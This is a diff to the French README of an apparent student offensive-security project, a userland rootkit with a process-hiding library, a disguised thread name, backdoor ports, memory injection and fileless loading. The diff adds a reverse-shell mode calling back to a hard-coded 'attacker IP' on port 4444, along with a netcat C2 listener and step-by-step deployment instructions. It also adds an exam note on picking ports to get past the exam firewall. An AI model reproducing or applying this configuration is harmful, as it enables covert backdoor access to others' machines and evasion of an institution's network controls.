@@ -108,8 +108,8 @@
 ## Configuration centralisée (`config.h`)
 
 ```c
-#define GHOST_PORT          9999
-#define SURVIVAL_PORT       8888
+#define GHOST_PORT          443
+#define SURVIVAL_PORT       8443
 #define KILL_SWITCH         "/tmp/.ghost_off"
 #define FAKE_THREAD_NAME    "[kworker/u24:5]"
 #define UNIX_BRIDGE        "ghost_bridge"
@@ -118,7 +118,15 @@
 
 #define TARGET_COMM_1       "gnome-terminal"
 #define TARGET_COMM_2       "zsh"
+
+/* Reverse shell configuration */
+#define GHOST_REVERSE_MODE   0       // 1 = enable reverse shell
+#define GHOST_REVERSE_HOST   "10.51.1.6"  // Attacker IP
+#define GHOST_REVERSE_PORT  4444     // Attacker port
+#define GHOST_RETRY_DELAY   5        // Seconds between retries
 ```
+
+> **Note exam** : Port 443 (HTTPS) et 8443 pour éviter le firewall. Se connecter depuis un réseau staff (10.42.x.x, 10.43.x.x, 10.0.8.x).
 
 ---
 
@@ -201,6 +209,30 @@ nc localhost 9999
 nc localhost 8888
 ```
 
+### Reverse Shell (bypass firewall)
+
+Pour contourner le firewall exam, utiliser le mode reverse shell :
+
+```c
+// Dans config.h
+#define GHOST_REVERSE_MODE   1
+#define GHOST_REVERSE_HOST   "10.51.1.6"  // IP autorisée par le firewall
+#define GHOST_REVERSE_PORT  4444
+```
+
+**Sur la machine autorisée (C2)** :
+```bash
+# Écouter les connexions
+nc -lvp 4444
+```
+
+**Usage** :
+1. Modifier config.h pour activer `GHOST_REVERSE_MODE = 1`
+2. Mettre une IP autorisée dans `GHOST_REVERSE_HOST` (ex: 10.51.1.6)
+3. Compiler hijack.so
+4. Déployer sur la cible
+5. La cible se connecte automatiquement à l'IP autorisée:4444
+
 ### Payload fileless
 
 ```bash
@@ -221,6 +253,7 @@ python3 stager.py -p hijack.so.enc -k <cle_hex_a_32_caracteres>
 C'est un **projet académique de cybersécurité** (École 42) qui implémente des techniques offensives avancées :
 - **Rootkit userland** : intercepte les appels système pour cacher un processus
 - **Backdoor réseau** : ouvre un shell distant sur un port secret
+- **Reverse shell** : se connecte à un serveur C2 distant (bypass firewall)
 - **Injection mémoire** : charge du code dans un processus distant sans toucher le disque
 - **Fileless execution** : tout reste en RAM, zero trace sur le disque
 
